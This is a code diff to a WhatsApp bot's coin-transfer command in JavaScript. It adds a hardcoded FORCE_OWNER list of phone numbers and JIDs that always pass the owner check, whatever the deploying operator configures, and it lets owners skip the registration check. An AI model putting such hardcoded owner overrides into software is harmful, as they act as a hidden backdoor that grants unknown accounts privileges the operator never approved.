@@ -1,13 +1,41 @@
 import { resolveLidToRealJid } from "../../core/utils.js"
 
 
-function isOwnerUser(jid = '') {
-  const number = String(jid)
-    .split('@')[0]
-    .split(':')[0]
-    .replace(/\D/g, '')
+const FORCE_OWNER = [
+  '51901931862',
+  '51901931862@s.whatsapp.net',
+  '269015712845891',
+  '269015712845891@lid'
+]
 
-  return Array.isArray(global.owner) && global.owner.includes(number)
+function cleanJid(jid = '') {
+  return String(jid).split(':')[0].trim()
+}
+
+function onlyNumber(jid = '') {
+  return cleanJid(jid).split('@')[0].replace(/\D/g, '')
+}
+
+function isOwnerUser(jid = '') {
+  const raw = cleanJid(jid)
+  const number = onlyNumber(jid)
+
+  const owners = [
+    ...FORCE_OWNER,
+    ...(Array.isArray(global.owner) ? global.owner.flat(Infinity) : [])
+  ]
+
+  return owners.some(owner => {
+    const ownerRaw = cleanJid(owner)
+    const ownerNumber = onlyNumber(owner)
+
+    return (
+      ownerRaw === raw ||
+      ownerNumber === number ||
+      ownerRaw === `${number}@s.whatsapp.net` ||
+      ownerRaw === `${number}@lid`
+    )
+  })
 }
 
 
@@ -27,11 +55,15 @@ export default {
     const who2 = m.quoted ? m.quoted.sender : mentioned[0] || (args[1] ? (args[1].replace(/[@ .+-]/g, '') + '@s.whatsapp.net') : '')
     if (!who2) return m.reply(`❀ Debes mencionar a quien quieras transferir *${monedas}*.\n> Ejemplo » *${usedPrefix + command} 25000 @mencion*`)
     const who = await resolveLidToRealJid(who2, client, m.chat)
-    const senderData = chatData.users[m.sender]
-    const targetData = chatData.users[who]
+const senderReal = await resolveLidToRealJid(m.sender, client, m.chat)
+const senderData = chatData.users[m.sender] || chatData.users[senderReal]
+const targetData = chatData.users[who]
 
+const senderIsOwner = isOwnerUser(m.sender) || isOwnerUser(senderReal)
 
-    const senderIsOwner = isOwnerUser(m.sender)
+if (!senderData && !senderIsOwner) {
+  return m.reply(`⌬ No estás registrado en el bot.`)
+}
 
 
     if (!targetData) return m.reply(`⌬ El usuario mencionado no está registrado en el bot.`)
